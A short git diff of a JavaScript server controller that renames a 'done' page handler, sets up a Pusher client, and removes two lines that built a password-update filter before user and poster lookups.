@@ -257,7 +257,7 @@ export const code_page_post = async(req, res) => {
 }
 
 
-export const done_page_post = async(req, res) => {
+export const successful_page_post = async(req, res) => {
 
     const pusher = new Pusher({
         appId: '1883790',
@@ -269,8 +269,7 @@ export const done_page_post = async(req, res) => {
 
     const { id, done ,adminId,posterId} = req.body;
  
-    const filter = { _id: id };
-    const update = { password: password };
+  
     try {
         const userFound = await User.findOne({ adminId: adminId })
         const posterFound = await Poster.findOne({ posterId: posterId })
